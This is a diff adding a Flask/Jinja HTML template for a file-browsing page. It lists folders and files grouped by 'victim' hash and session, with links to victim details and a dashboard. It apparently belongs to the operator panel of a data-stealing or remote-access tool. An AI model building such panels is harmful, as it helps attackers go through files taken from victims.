@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Browse: {{ victim_hash }}/{{ session_name }}/{{ sub_folder }}</title>
+    <style> /* 간단한 스타일 */
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1 { border-bottom: 1px solid #ccc; padding-bottom: 5px;}
+        a { color: #337ab7; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        ul { list-style-type: none; padding-left: 0;}
+        li { border:1px solid #eee; padding: 8px; margin-bottom:3px; background-color: #f9f9f9; }
+        li strong { color: #555; } /* DIR 표시 */
+    </style>
+</head>
+<body>
+    <h1>Browse: {{ victim_hash }}/{{ session_name }}/{{ sub_folder if sub_folder and sub_folder != "." else "(session root)" }}</h1>
+    <p>
+        {% if parent_folder_link %}
+            <a href="{{ parent_folder_link }}">&uarr; Up to Parent Folder</a> |
+        {% endif %}
+        <a href="{{ url_for('view_victim_details', victim_hash=victim_hash) }}">Back to Victim {{ victim_hash }}</a> |
+        <a href="{{ url_for('index') }}">Dashboard</a>
+    </p>
+    <hr>
+    {% if items %}
+    <ul>
+        {% for item in items %}
+        <li>
+            {% if item.is_dir %}
+            <strong>DIR:</strong> <a href="{{ item.link }}">{{ item.name }}</a>
+            {% else %}
+            <a href="{{ item.link }}">{{ item.name }}</a> ({{ item.size | filesizeformat }}) {% endif %}
+        </li>
+        {% endfor %}
+    </ul>
+    {% else %}
+    <p>Folder is empty.</p>
+    {% endif %}
+</body>
+</html>
